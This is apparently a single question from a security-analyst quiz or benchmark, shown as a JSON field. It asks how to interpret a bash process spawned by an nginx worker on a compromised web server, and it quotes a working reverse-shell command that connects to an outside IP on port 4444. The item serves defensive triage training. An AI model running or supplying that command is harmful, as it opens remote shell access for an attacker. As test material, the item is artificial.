        "question": "You are a SOC analyst triaging a compromised web server. In 'ps -ef --forest' you see a /bin/bash process whose PPID belongs to the nginx worker, and its command line reads 'bash -i >& /dev/tcp/45.9.148.7/4444 0>&1'. What is the most accurate conclusion?",
